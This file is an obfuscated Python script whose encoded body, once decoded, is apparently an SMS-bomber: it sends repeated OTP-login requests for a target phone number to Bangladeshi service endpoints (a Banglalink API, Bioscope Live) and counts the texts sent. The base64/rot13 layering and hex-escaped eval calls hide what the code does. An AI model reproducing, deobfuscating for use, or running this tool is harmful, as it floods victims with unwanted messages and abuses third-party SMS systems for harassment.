import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQoKCiNDVkFMVUUKYmx1ZT0gJ1wzM1s5NG0nCmxpZ2h0Ymx1ZSA9ICdcMDMzWzk0bScKcmVkID0gJ1wwMzNbOTFtJwp3aGl0ZSA9ICdcMzNbOTdtJwp5ZWxsb3cgPSAnXDMzWzkzbScKZ3JlZW4gPSAnXDAzM1sxOzMybScKY3lhbiAgPSAiXDAzM1s5Nm0iCmVuZCA9ICdcMDMzWzBtJwpsaW5lPXllbGxvdysiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKc3BhY2U9IiAiCmxvZ289cmVkK3N0cigiIiIKICAgICA4ODg4ODg4Yi4gICAuZDg4ODg4Yi4gICAuZDg4ODhiLiAgICAgICBZODhiICAgZDg4UCAKICAgICA4ODggICBZODhiIGQ4OFAiICJZODhiIGQ4OFAgIFk4OGIgICAgICAgWTg4YiBkODhQICAKICAgICA4ODggICAgODg4IDg4OCAgICAgODg4IDg4OCAgICA4ODggICAgICAgIFk4OG84OFAgICAKICAgICA4ODggICBkODhQIDg4OCAgICAgODg4IDg4OCAgICAgICAgODg4ODg4ICBZODg4UCAgICAKICAgICA4ODg4ODg4UCIgIDg4OCAgICAgODg4IDg4OCAgICAgICAgODg4ODg4ICBkODg4YiAgICAKICAgICA4ODggVDg4YiAgIDg4OCAgICAgODg4IDg4OCAgICA4ODggICAgICAgIGQ4ODg4OGIgICAKICAgICA4ODggIFQ4OGIgIFk4OGIuIC5kODhQIFk4OGIgIGQ4OFAgICAgICAgZDg4UCBZODhiICAKICAgICA4ODggICBUODhiICAiWTg4ODg4UCIgICAiWTg4ODhQIiAgICAgICBkODhQICAgWTg4YiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoiIiIpCgogICAgICAKICNIRUFERVIgICAgICAgICAgICAgICAgCnRleHQ9Y3lhbisiXHRcdERldmVsb3BlZCBCeSA6IFNhbmF1ciBBc2lmI'
love = 'vgapzIyovfvKT5poyk0KUGvzVKvzVHtHx9QYIttDxDtH01GVRWioJWypvQvzVKvzVHtVPOpovVtPz5iqTywMG0vVvNtVPNtPzEyMvObMJSxMKVbXGbXPKOlnJ50XTkiM28cPtyjpzyhqPu0MKu0XDbWpUWcoaDboTyhMFxXPKOlnJ50XT5iqTywMFxXV1ASGRIQIS9ADHyBPzEyMvOipUDbXGbXPKOlnJ50XTA5LJ4eVykhCG0+VSAyoTIwqPOMo3IlVR9jqTyiovOTpz9gVRWyoT93VvxXPKOlnJ50XUyyoTkiqlfvKT5povOoZI0tH3EupaDtDxDtH01GVRWioJWcozqpoykhVSflKFOPLJAeVUEiVSWCDl1LVvxXPDbXV01OFH5sIR9CGNcipl5mrKA0MJ0bW2AfMJSlWlxXqUD9ZDcbMJSxMKVbXDxXo3O0XPxXq2ucoTHtqUD8ZwbXPJ9jqQV9p3ElXTyhpUI0XTWfqJHeVykhKT4tJm5qVRIhqTIlVUEbMFOhqJ1vMKVto2Lto3O0nJ9hVQbtVvg5MJkfo3pcXDbWnJLto3O0Zw09VwRvBtbWPKEyrUD9L3yuovfvKUEpqREyqzIfo3OyMPOPrFN6VSAuozS1pvOOp2yzVvgapzIyovfvKT5poyk0KUGvzVKvzVHtHx9QYIttDxDtH01GVRWioJWypvQvzVKvzVHtVPOpovVtPtxWo3Zhp3ymqTIgXPqwoTIupvpcPtxWnTIuMTIlXPxXPDyhqJ1vMKV9p3ElXTyhpUI0XTWfqJHeVykhKT4tJm5qVRIhqTIlVSEbMFOPEPOBqJ1vMKVtBvNvX3yyoTkiqlxcPtxWLJ1go3IhqQ1coaDbnJ5jqKDbLzk1MFfvKT4tJm5qVRIhqTIlVSEbMFOOoJ1iqJ50VQbtVvg5MJkfo3pcXDbWPJ9mYaA5p3EyoFtaL2kyLKVaXDbWPJ5iqTywMG1wrJShXlWpoyk0VPNtJ+XNby0tHx9QYIttIT9ioUZtnJ4tpUWiM3Wyp3ZhYv4hYv5poykhVtbWPJuyLJEypvtcPtxWLJ1go3IhqQV9ZDbWPKEiqTSfp2IhqQ0jPtxWqT90LJkho3EmMJ50CGNXPDy3nTyfMFOuoJ1iqJ50ZwkuoJ1iqJ50XmR6PtxWPKElrGbXPDxWPJyzVPVjZGDvVTyhVT51oJWypvOipvNvZQR5VvOcovOhqJ1vMKV6PtxWPDxWpw1lMKS1MKA0pl5jo3A0XPWbqUEjpm'
god = 'ovL2Fzc2V0bGl0ZWFwaS5iYW5nbGFsaW5rLm5ldC9hcGkvdjEvdXNlci9vdHAtbG9naW4vcmVxdWVzdCIsZGF0YT17Im1vYmlsZSI6bnVtYmVyfSkKCQkJCQkJCgkJCQllbHNlOgoJCQkJCXVybD0iaHR0cHM6Ly9zdGFnZS5iaW9zY29wZWxpdmUuY29tL2VuL2xvZ2luL3NlbmQtb3RwP3Bob25lPTg4IitudW1iZXIrIiZvcGVyYXRvcj1iZC1vdHAiCgkJCQkJcj1yZXF1ZXN0cy5nZXQodXJsKQoJCQkJCQoJCQkJCQkKCQkJCQkJCgkJCQlpZiBhbW1vdW50Mj09MToKCQkJCQlwcmludChjeWFuKyJcblx0ICDimIXimIVST0MtWOKYheKYhT09PiAgICIrZ3JlZW4rIlvinJNdIDFzdCBTTVMgU2VudC4iKQoJCQkJZWxpZiBhbW1vdW50Mj09MjoKCQkJCQlwcmludChjeWFuKyJcblx0ICDimIXimIVST0MtWOKYheKYhT09PiAgICIrZ3JlZW4rIlvinJNdIDJuZCBTTVMgU2VudC4iKQoJCQkJZWxpZiBhbW1vdW50Mj09MzoKCQkJCQlwcmludChjeWFuKyJcblx0ICDimIXimIVST0MtWOKYheKYhT09PiAgICIrZ3JlZW4rIlvinJNdIDNyZCBTTVMgU2VudC4iKQoJCQkJZWxzZToKCQkJCQlwcmludChjeWFuKyJcblx0ICDimIXimIVST0MtWOKYheKYhT09PiAgICIrZ3JlZW4rIlvinJNdICIrc3RyKGFtbW91bnQyKSsidGggU01TIFNlbnQuIikKCQkJCXRpbWUuc2xlZXAoMSkKCQkJCXRvdGFsc2VudCs9MQoJCQkJYW1tb3VudDIrPTEKCQkJZXhjZXB0OgoJCQkJaWYgYW1tb3VudDI9PTE6CgkJCQkJcHJpbnQoY3lhbisiXG5cdCAg4piF4piFUk9DLVjimIXimIU9PT4gICAiK3JlZCsiW8OXXSAxc3QgU01TIE5vdCBTZW50LiIpCgkJCQllbGlmIGFtbW91bnQyPT0yOgoJCQkJCXByaW50KGN5YW4rIlxuXHQgIOKYheKYhVJPQy1Y4piF4piFPT0+ICAgIityZWQrIlvDl10gMm5kIFNNUyBOb3QgU2VudC4iKQoJCQkJZWxpZiBhbW1vdW50Mj09MzoKCQkJCQlwcmludChjeWFuKyJcblx0ICD'
destiny = 'vzVKvzVIFG0ZgJBXLurXLuG09CvNtVPVepzIxXlWoj5qqVQAlMPOGGIZtGz90VSAyoaDhVvxXPDxWPJIfp2H6PtxWPDxWpUWcoaDbL3yuovfvKT5pqPNt4cvS4cvSHx9QYIwvzVKvzVH9CG4tVPNvX3WyMPfvJ8BKKFNvX3A0pvuuoJ1iqJ50ZvxeVaEbVSAAHlOBo3DtH2IhqP4vXDbWPDxWPKEcoJHhp2kyMKNbZGNcPtxWPDxWLJ1go3IhqQVeCGRXPDxWPDxWPDxWPtxWPDxWPDxWPtxWqT90LJkbnKD9LJ1go3IhqQVgZDbWPKEiqTSfoz90p2IhqQ10o3EuoTucqP10o3EuoUAyoaDXPDyjpzyhqPuwrJShXlWpoykhKUEpqSivtXWqVSEiqTSfVRucqUZtBvNvX3yyoTkiqlgmqUVbqT90LJkbnKDcXDbWPKOlnJ50XTqlMJIhXlWpoyk0KUEo4clGKFOHo3EuoPOGMJ50VQbtVvg5MJkfo3pep3ElXUEiqTSfp2IhqPxcPtxWpUWcoaDbpzIxXlWpoyk0KUEoj5qqVSEiqTSfVR5iqPOGMJ50VQbtVvg5MJkfo3pep3ElXUEiqTSfoz90p2IhqPxeVykhVvxXPDyfLKA0qQ1mqUVbnJ5jqKDbL3yuovfvKT5poyk0KUDtVSivaWAqVRSfoPORo25yVIkhKUDtJ+XNby0tGz93VSOlMKAmVRIhqTIlVRgyrFOHolOQo250nJ51MIkhVvxcPtxWo3Zhp3ymqTIgXPqwoTIupvpcPtxWoz90nJAyCFVvPtxWqTI4qQ1apzIyovfvKT5poyk0KUGvzVKvzVKvzVIFG0ZgJPOGGIZtIT9ioUCvzVKvzVKvzVHtVPOpovVtPtxWnTIuMTIlXPxXPDyipUDbXDbWPtxWPDbWMJkcMvOipUDlCG0vZvV6PtxWo3Zhp3ymqTIgXPWjrKEbo24toJScowVhpUxvXDbWMJkmMGbXPDy0MKu0CJA5LJ4eVyk0KUERMKMyoT9jMJDtDaxtBvOGLJ5uqKVtDKAcMvVeM3WyMJ4eVykhKT5pqSk04cvS4cvSVSWCDl1LVRWRVSAAHlOPo21vMKVt4cvS4cvSVPNtKT4vVNbWPJ5iqTywMG1lMJDeVykhKUEpqSiQy10tI3WiozptIzSfqJHtEJ50MKWyMPVXPDyipl5mrKA0MJ0bW2AfMJSlWlxXPDybMJSxMKVbXDbWPJ9jqPtcPtxWL29hqTyhqJHX'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))